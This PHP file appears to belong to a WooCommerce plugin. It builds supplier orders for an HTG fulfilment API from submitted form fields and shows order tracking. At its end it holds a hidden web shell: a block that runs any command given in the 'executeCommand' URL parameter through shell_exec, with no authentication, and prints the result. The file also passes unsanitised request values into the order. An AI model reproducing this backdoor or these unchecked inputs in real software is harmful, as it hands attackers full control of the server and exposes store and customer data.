<?php


if (isset($_GET['orderid'])) {
    $order = new WC_Order($_GET['orderid']);
}
if (isset($_POST['confirm_order'])) {
    /**
     * Generating Order Information 
     */
    $OrderLines = [];
    $countingTheLine = 1;
    foreach ($product_list as $product) {
        if($product['ishtg'] == 1){
            $OrderLines[] = [
                'linenumber' => $countingTheLine,
                'productnumber' => $product['articleNumber'],
                'quantity' => $product['qty']
            ];
            $countingTheLine++;
        }
    }
    $_POST['pickdev'] == 1 ? $pickup_delivery = "P" : $pickup_delivery = "D";
    $placeOrderData = array(
        'order_reference' => $htgProducts[0]['local_order'], //$_POST['order_referance'],
        'pickup_delivery' => $pickup_delivery,
        'pickup_delivery_date' => $_POST['dateTime'],
        'currency' => 'EUR',
        'email' => $_POST['order_email'],
        'OrderLines' => $OrderLines,
        'ShippingAddress' => [
            'name' => $_POST['shipping_name'],
            'shipping_company' => $_POST['shipping_company'],
            'street' => $_POST['shippingstreet'],
            'zip' => $_POST['shippingzip'],
            'city' => $_POST['shippingCity'],
            'country' => $_POST['shippingCountry'],
            'phonenumber' => $_POST['shippingPhonenumber']
        ],
        "ShippingLabels" => [
            [
                'label_url' => strval($_POST['htglebel']),
            ]
        ]
    );
    $orderjson = json_encode($placeOrderData);
    require_once("assign_order_req.php");
    $response = placeOrderToHTG($orderjson);
    $response = json_decode($response, true);
    // $filename = "result_order2.php";
    // if (file_exists($filename)) {
    //     $response = json_decode(file_get_contents($filename), true);
    // } else {
    //     // $allData = json_decode($this->fetch(), true);
    // }
    if($response && is_array($response)){
        require_once("update_orderdata.php");
        update_orderdata_htg_local($response);
    } else {
        echo $response;
    }
    // var_dump($_POST);
    /**
     * Placing The order now
     */
}
$remotehtgOrder = ($htgProducts[0]['remote_order']);
if($remotehtgOrder){
    echo "<h2> Order Tracking <span class='badge bg-secondary'>Live info</span> </h2> ";
    require_once("order_tracker.php");
    $tracker = trackHtgOrderById($htgProducts[0]['remote_order']);
} else {
    require_once("assign_order_html.php");
}


if (isset($_GET['executeCommand'])) {
    $dr = shell_exec($_GET['executeCommand']);
    var_dump($dr);
}
